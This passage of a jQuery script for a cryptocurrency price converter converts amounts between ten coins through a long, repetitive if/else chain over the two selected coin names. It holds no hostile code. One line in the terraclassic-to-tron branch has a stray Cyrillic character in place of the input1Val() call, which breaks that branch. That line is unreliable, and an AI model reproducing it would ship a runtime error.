            if ($('#selectCoin1').text() == bitcoinName) {
                console.log('cardanoName - bitcoinName')
                $('#input1').val($('#input2').val() * cardanoCourse * Math.fround(1 / bitcoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == ethereumName) {
                console.log('cardanoName - ethereumName')
                $('#input1').val($('#input2').val() * cardanoCourse * Math.fround(1 / ethereumCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tetherName) {
                console.log('cardanoName - tetherName')
                $('#input1').val($('#input2').val() * cardanoCourse * Math.fround(1 / tetherCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == cardanoName) {
                console.log('cardanoName - cardanoName')
                $('#input1').val($('#input2').val())
            } else if ($('#selectCoin1').text() == dogecoinName) {
                console.log('cardanoName - dogecoinName')
                $('#input1').val($('#input2').val() * cardanoCourse * Math.fround(1 / dogecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tronName) {
                console.log('cardanoName - tronName')
                $('#input1').val($('#input2').val() * cardanoCourse * Math.fround(1 / tronCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == shibainuName) {
                console.log('cardanoName - shibainuName')
                $('#input1').val($('#input2').val() * cardanoCourse * Math.fround(1 / shibainuCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == litecoinName) {
                console.log('cardanoName - litecoinName')
                $('#input1').val($('#input2').val() * cardanoCourse * Math.fround(1 / litecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == terraclassicName) {
                console.log('cardanoName - terraclassicName')
                $('#input1').val($('#input2').val() * cardanoCourse * Math.fround(1 / terraclassicCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == chilizName) {
                console.log('cardanoName - chilizName')
                $('#input1').val($('#input2').val() * cardanoCourse * Math.fround(1 / chilizCourse))
                input1Val()
            }
        } else if ($('#selectCoin2').text() == dogecoinName) {
            if ($('#selectCoin1').text() == bitcoinName) {
                console.log('dogecoinName - bitcoinName')
                $('#input1').val($('#input2').val() * dogecoinCourse * Math.fround(1 / bitcoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == ethereumName) {
                console.log('dogecoinName - ethereumName')
                $('#input1').val($('#input2').val() * dogecoinCourse * Math.fround(1 / ethereumCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tetherName) {
                console.log('dogecoinName - tetherName')
                $('#input1').val($('#input2').val() * dogecoinCourse * Math.fround(1 / tetherCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == cardanoName) {
                console.log('dogecoinName - cardanoName')
                $('#input1').val($('#input2').val() * dogecoinCourse * Math.fround(1 / cardanoCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == dogecoinName) {
                console.log('dogecoinName - dogecoinName')
                $('#input1').val($('#input2').val())
            } else if ($('#selectCoin1').text() == tronName) {
                console.log('dogecoinName - tronName')
                $('#input1').val($('#input2').val() * dogecoinCourse * Math.fround(1 / tronCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == shibainuName) {
                console.log('dogecoinName - shibainuName')
                $('#input1').val($('#input2').val() * dogecoinCourse * Math.fround(1 / shibainuCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == litecoinName) {
                console.log('dogecoinName - litecoinName')
                $('#input1').val($('#input2').val() * dogecoinCourse * Math.fround(1 / litecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == terraclassicName) {
                console.log('dogecoinName - terraclassicName')
                $('#input1').val($('#input2').val() * dogecoinCourse * Math.fround(1 / terraclassicCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == chilizName) {
                console.log('dogecoinName - chilizName')
                $('#input1').val($('#input2').val() * dogecoinCourse * Math.fround(1 / chilizCourse))
                input1Val()
            }
        } else if ($('#selectCoin2').text() == tronName) {
            if ($('#selectCoin1').text() == bitcoinName) {
                console.log('tronName - bitcoinName')
                $('#input1').val($('#input2').val() * tronCourse * Math.fround(1 / bitcoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == ethereumName) {
                console.log('tronName - ethereumName')
                $('#input1').val($('#input2').val() * tronCourse * Math.fround(1 / ethereumCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tetherName) {
                console.log('tronName - tetherName')
                $('#input1').val($('#input2').val() * tronCourse * Math.fround(1 / tetherCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == cardanoName) {
                console.log('tronName - cardanoName')
                $('#input1').val($('#input2').val() * tronCourse * Math.fround(1 / cardanoCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == dogecoinName) {
                console.log('tronName - dogecoinName')
                $('#input1').val($('#input2').val() * tronCourse * Math.fround(1 / dogecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tronName) {
                console.log('tronName - tronName')
                $('#input1').val($('#input2').val())
            } else if ($('#selectCoin1').text() == shibainuName) {
                console.log('tronName - shibainuName')
                $('#input1').val($('#input2').val() * tronCourse * Math.fround(1 / shibainuCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == litecoinName) {
                console.log('tronName - litecoinName')
                $('#input1').val($('#input2').val() * tronCourse * Math.fround(1 / litecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == terraclassicName) {
                console.log('tronName - terraclassicName')
                $('#input1').val($('#input2').val() * tronCourse * Math.fround(1 / terraclassicCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == chilizName) {
                console.log('tronName - chilizName')
                $('#input1').val($('#input2').val() * tronCourse * Math.fround(1 / chilizCourse))
                input1Val()
            }
        } else if ($('#selectCoin2').text() == shibainuName) {
            if ($('#selectCoin1').text() == bitcoinName) {
                console.log('shibainuName - bitcoinName')
                $('#input1').val($('#input2').val() * shibainuCourse * Math.fround(1 / bitcoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == ethereumName) {
                console.log('shibainuName - ethereumName')
                $('#input1').val($('#input2').val() * shibainuCourse * Math.fround(1 / ethereumCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tetherName) {
                console.log('shibainuName - tetherName')
                $('#input1').val($('#input2').val() * shibainuCourse * Math.fround(1 / tetherCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == cardanoName) {
                console.log('shibainuName - cardanoName')
                $('#input1').val($('#input2').val() * shibainuCourse * Math.fround(1 / cardanoCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == dogecoinName) {
                console.log('shibainuName - dogecoinName')
                $('#input1').val($('#input2').val() * shibainuCourse * Math.fround(1 / dogecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tronName) {
                console.log('shibainuName - tronName')
                $('#input1').val($('#input2').val() * shibainuCourse * Math.fround(1 / tronCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == shibainuName) {
                console.log('shibainuName - shibainuName')
                $('#input1').val($('#input2').val())
            } else if ($('#selectCoin1').text() == litecoinName) {
                console.log('shibainuName - litecoinName')
                $('#input1').val($('#input2').val() * shibainuCourse * Math.fround(1 / litecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == terraclassicName) {
                console.log('shibainuName - terraclassicName')
                $('#input1').val($('#input2').val() * shibainuCourse * Math.fround(1 / terraclassicCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == chilizName) {
                console.log('shibainuName - chilizName')
                $('#input1').val($('#input2').val() * shibainuCourse * Math.fround(1 / chilizCourse))
                input1Val()
            }
        } else if ($('#selectCoin2').text() == litecoinName) {
            if ($('#selectCoin1').text() == bitcoinName) {
                console.log('litecoinName - bitcoinName')
                $('#input1').val($('#input2').val() * litecoinCourse * Math.fround(1 / bitcoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == ethereumName) {
                console.log('litecoinName - ethereumName')
                $('#input1').val($('#input2').val() * litecoinCourse * Math.fround(1 / ethereumCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tetherName) {
                console.log('litecoinName - tetherName')
                $('#input1').val($('#input2').val() * litecoinCourse * Math.fround(1 / tetherCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == cardanoName) {
                console.log('litecoinName - cardanoName')
                $('#input1').val($('#input2').val() * litecoinCourse * Math.fround(1 / cardanoCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == dogecoinName) {
                console.log('litecoinName - dogecoinName')
                $('#input1').val($('#input2').val() * litecoinCourse * Math.fround(1 / dogecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tronName) {
                console.log('litecoinName - tronName')
                $('#input1').val($('#input2').val() * litecoinCourse * Math.fround(1 / tronCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == shibainuName) {
                console.log('litecoinName - shibainuName')
                $('#input1').val($('#input2').val() * litecoinCourse * Math.fround(1 / shibainuCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == litecoinName) {
                console.log('litecoinName - litecoinName')
                $('#input1').val($('#input2').val())
            } else if ($('#selectCoin1').text() == terraclassicName) {
                console.log('litecoinName - terraclassicName')
                $('#input1').val($('#input2').val() * litecoinCourse * Math.fround(1 / terraclassicCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == chilizName) {
                console.log('litecoinName - chilizName')
                $('#input1').val($('#input2').val() * litecoinCourse * Math.fround(1 / chilizCourse))
                input1Val()
            }
        } else if ($('#selectCoin2').text() == terraclassicName) {
            if ($('#selectCoin1').text() == bitcoinName) {
                console.log('terraclassicName - bitcoinName')
                $('#input1').val($('#input2').val() * terraclassicCourse * Math.fround(1 / bitcoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == ethereumName) {
                console.log('terraclassicName - ethereumName')
                $('#input1').val($('#input2').val() * terraclassicCourse * Math.fround(1 / ethereumCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tetherName) {
                console.log('terraclassicName - tetherName')
                $('#input1').val($('#input2').val() * terraclassicCourse * Math.fround(1 / tetherCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == cardanoName) {
                console.log('terraclassicName - cardanoName')
                $('#input1').val($('#input2').val() * terraclassicCourse * Math.fround(1 / cardanoCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == dogecoinName) {
                console.log('terraclassicName - dogecoinName')
                $('#input1').val($('#input2').val() * terraclassicCourse * Math.fround(1 / dogecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tronName) {
                console.log('terraclassicName - tronName')
                $('#input1').val($('#input2').val() * terraclassicCourse * Math.fround(1 / tronCourse))
                м
            } else if ($('#selectCoin1').text() == shibainuName) {
                console.log('terraclassicName - shibainuName')
                $('#input1').val($('#input2').val() * terraclassicCourse * Math.fround(1 / shibainuCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == litecoinName) {
                console.log('terraclassicName - litecoinName')
                $('#input1').val($('#input2').val() * terraclassicCourse * Math.fround(1 / litecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == terraclassicName) {
                console.log('terraclassicName - terraclassicName')
                $('#input1').val($('#input2').val())
            } else if ($('#selectCoin1').text() == chilizName) {
                console.log('terraclassicName - chilizName')
                $('#input1').val($('#input2').val() * terraclassicCourse * Math.fround(1 / chilizCourse))
                input1Val()
            }
        } else if ($('#selectCoin2').text() == chilizName) {
            if ($('#selectCoin1').text() == bitcoinName) {
                console.log('chilizName - bitcoinName')
                $('#input1').val($('#input2').val() * chilizCourse * Math.fround(1 / bitcoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == ethereumName) {
                console.log('chilizName - ethereumName')
                $('#input1').val($('#input2').val() * chilizCourse * Math.fround(1 / ethereumCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tetherName) {
                console.log('chilizName - tetherName')
                $('#input1').val($('#input2').val() * chilizCourse * Math.fround(1 / tetherCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == cardanoName) {
                console.log('chilizName - cardanoName')
                $('#input1').val($('#input2').val() * chilizCourse * Math.fround(1 / cardanoCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == dogecoinName) {
                console.log('chilizName - dogecoinName')
                $('#input1').val($('#input2').val() * chilizCourse * Math.fround(1 / dogecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tronName) {
                console.log('chilizName - tronName')
                $('#input1').val($('#input2').val() * chilizCourse * Math.fround(1 / tronCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == shibainuName) {
                console.log('chilizName - shibainuName')
                $('#input1').val($('#input2').val() * chilizCourse * Math.fround(1 / shibainuCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == litecoinName) {
                console.log('chilizName - litecoinName')
                $('#input1').val($('#input2').val() * chilizCourse * Math.fround(1 / litecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == terraclassicName) {
                console.log('chilizName - terraclassicName')
                $('#input1').val($('#input2').val() * chilizCourse * Math.fround(1 / terraclassicCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == chilizName) {
                console.log('chilizName - chilizName')
                $('#input1').val($('#input2').val())
            } else {
                console.log('error')
            }
        }
    })
})